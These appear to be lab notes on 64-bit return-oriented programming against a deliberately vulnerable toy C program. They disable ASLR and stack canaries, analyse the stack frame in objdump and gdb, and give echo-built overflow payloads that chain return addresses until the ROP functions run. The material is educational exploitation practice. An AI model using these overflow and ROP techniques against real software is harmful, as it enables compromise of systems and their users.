https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming

But make it 64 bit, don't use too-custom GDB scripts, and bump up against mitigations instead of disabling at the at the outset.

disable ASLR:
# echo 0 > /proc/sys/kernel/randomize_va_space # doesn't work
# see https://superuser.com/questions/127238/how-to-turn-off-aslr-in-ubuntu-9-10
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"

$ gcc rop1a.c -o rop1a
$ objdump -d ./rop1a --disassembler-options=intel
  00000000000011d7 <vulnerable>:
      11d7:       f3 0f 1e fa             endbr64 
      11db:       55                      push   rbp
      11dc:       48 89 e5                mov    rbp,rsp
      11df:       48 83 c4 80             add    rsp,0xffffffffffffff80   ; sub 128

      11e3:       48 89 7d 88             mov    QWORD PTR [rbp-0x78],rdi ; save arg0 to us (string)

      11e7:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28    ; access stack check value
      11ee:       00 00 
      11f0:       48 89 45 f8             mov    QWORD PTR [rbp-0x8],rax  ; place it in stack

      11f4:       31 c0                   xor    eax,eax
      11f6:       48 8b 55 88             mov    rdx,QWORD PTR [rbp-0x78] ; rdx = string

      11fa:       48 8d 45 90             lea    rax,[rbp-0x70]           ; rax -> buffer 
      11fe:       48 89 d6                mov    rsi,rdx                  ; arg1=string
      1201:       48 89 c7                mov    rdi,rax                  ; arg0=buffer
      1204:       e8 67 fe ff ff          call   1070 <strcpy@plt>
      1209:       90                      nop
      120a:       48 8b 45 f8             mov    rax,QWORD PTR [rbp-0x8]  ; get stack check value
      120e:       64 48 2b 04 25 28 00    sub    rax,QWORD PTR fs:0x28    ; check against known
      1215:       00 00 
      1217:       74 05                   je     121e <vulnerable+0x47>   ; is equal, pass
      1219:       e8 72 fe ff ff          call   1090 <__stack_chk_fail@plt>
      121e:       c9                      leave  
      121f:       c3                      ret

vulnerable()'s frame:

---------------- <- RBP-0x80 <- RSP
???
---------------- <- RBP-0x78
saved arg0:string
---------------- <- RBP-0x70
buffer

---------------- <- RBP-0x8
stack check value
---------------- <- RBP
old RBP
----------------
RIP of caller
----------------

But we can't overflow buffer into old RBP and RIP of caller without killing stack check value!

Overcoming this is exercise for another day. For now, just disable:

$ gcc -fno-stack-protector rop1a.c -o rop1a
$ objdump -d ./rop1a --disassembler-options=intel
    00000000000011b7 <vulnerable>:
      11b7:       f3 0f 1e fa             endbr64 
      11bb:       55                      push   rbp
      11bc:       48 89 e5                mov    rbp,rsp
      11bf:       48 83 c4 80             add    rsp,0xffffffffffffff80
      11c3:       48 89 7d 88             mov    QWORD PTR [rbp-0x78],rdi
      11c7:       48 8b 55 88             mov    rdx,QWORD PTR [rbp-0x78]
      11cb:       48 8d 45 90             lea    rax,[rbp-0x70]
      11cf:       48 89 d6                mov    rsi,rdx
      11d2:       48 89 c7                mov    rdi,rax
      11d5:       e8 86 fe ff ff          call   1060 <strcpy@plt>
      11da:       90                      nop
      11db:       c9                      leave  
      11dc:       c3                      ret

Note: leave does "mov rsp, rbp; pop rbp"
Note: endbr64 is endbranch instruction, from Control-flow Enforcement Technology (CET)

vulnerable()'s frame is mostly the same: same offsets, just no stored canary

---------------- <- RBP-0x80 <- RSP
???
---------------- <- RBP-0x78
saved arg0:string
---------------- <- RBP-0x70
buffer
---------------- <- RBP
old RBP
----------------
RIP of caller
----------------

Here are 0x70 0xAA's to fill buffer, 8 0xBB's to overwrite old RBP, then 8 0xCC's to overwrite RIP

echo -n -e "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC" > ./payload.bin
xxd -g 1 payload.bin
ulimit -c unlimited                                            # enable core files
./rop1a $(<payload.bin)
# sudo rm -f /var/lib/apport/coredump/*                        # clear old ones
gdb ./rop1a $(ls -dtr /var/lib/apport/coredump/* | tail -n 1)  # gdb with latest core

Core shows state at ret, rbp has accepted the BB's:

(gdb) x/16i vulnerable
...
=> 0x55ccd27991dc <vulnerable+37>:	ret
(gdb) info r rbp
rbp            0xbbbbbbbbbbbbbbbb  0xbbbbbbbbbbbbbbbb

Verify the functions are always in the same spot.
(gdb) p rop1
$2 = {<text variable, no debug info>} 0x55ccd2799169 <rop1>
(gdb) p rop2
$3 = {<text variable, no debug info>} 0x55ccd2799183 <rop2>
(gdb) p rop3
$4 = {<text variable, no debug info>} 0x55ccd279919d <rop3>
(gdb) p vulnerable
$5 = {<text variable, no debug info>} 0x55ccd27991b7 <vulnerable>
(gdb) p exit
$6 = {void (int)} 0x7f9b4c2455f0 <__GI_exit>

Add those addresses to the chain, encode little-endian:

echo -n -e "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xBB\xBB\xBB\xBB\xBB\xBB\xBB\xBB\x69\x91\x79\xd2\xcc\x55\x00\x00\x83\x91\x79\xd2\xcc\x55\x00\x00\x9d\x91\x79\xd2\xcc\x55\x00\x00\xb7\x91\x79\xd2\xcc\x55\x00\x00" > ./payload.bin

$ xxd -g 8 -e payload.bin
00000000: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000010: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000020: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000030: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000040: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000050: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000060: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000070: aaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbb  ................
00000080: 000055ccd2799169 000055ccd2799183  i.y..U....y..U..
00000090: 000055ccd279919d 000055ccd27991b7  ..y..U....y..U..

Uh oh, address are 8 bytes, so 0x55ccd2799169 is actually 0x000055ccd2799169 and we have NULLs which strcpy() stops on.

Ok, make modification: read from stdin instead of commandline argument, and use memcpy instead of strcpy, see rop2a.c

gcc -fno-stack-protector rop2a.c -o rop2a

New function:

00000000000011f7 <vulnerable>:
      11f7:       f3 0f 1e fa             endbr64 
      11fb:       55                      push   rbp
      11fc:       48 89 e5                mov    rbp,rsp
      11ff:       48 83 c4 80             add    rsp,0xffffffffffffff80      # ok, same
      1203:       48 89 7d 88             mov    QWORD PTR [rbp-0x78],rdi
      1207:       89 75 84                mov    DWORD PTR [rbp-0x7c],esi
      120a:       8b 45 84                mov    eax,DWORD PTR [rbp-0x7c]
      120d:       48 63 d0                movsxd rdx,eax
      1210:       48 8b 4d 88             mov    rcx,QWORD PTR [rbp-0x78]
      1214:       48 8d 45 90             lea    rax,[rbp-0x70]
      1218:       48 89 ce                mov    rsi,rcx
      121b:       48 89 c7                mov    rdi,rax
      121e:       e8 8d fe ff ff          call   10b0 <memcpy@plt>
      1223:       90                      nop
      1224:       c9                      leave  
      1225:       c3                      ret

New frame:

---------------- <- RBP-0x80 <- RSP
???
---------------- <- RBP-0x7C
saved arg1:length (4 bytes)
---------------- <- RBP-0x78
saved arg0:string (8 bytes)
---------------- <- RBP-0x70
buffer
---------------- <- RBP
old RBP
----------------
RIP of caller
----------------

(gdb) p rop1
$2 = {<text variable, no debug info>} 0x5555555551a9 <rop1>
(gdb) p rop2
$3 = {<text variable, no debug info>} 0x5555555551c3 <rop2>
(gdb) p rop3
$4 = {<text variable, no debug info>} 0x5555555551dd <rop3>
(gdb) p exit
$5 = {void (int)} 0x7ffff7c455f0 <__GI_exit>

$ xxd -g 8 -e payload.bin
00000000: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000010: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000020: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000030: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000040: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000050: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000060: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000070: bbbbbbbbbbbbbbbb 00005555555551a9  .........QUUUU..
00000080: 00005555555551c3 00005555555551dd  .QUUUU...QUUUU..
00000090: 00007ffff7c455f0                   .U......

$ ./rop2a < ./payload.bin
read() returned 0x98
ROP 1!
ROP 2!
ROP 3!
$
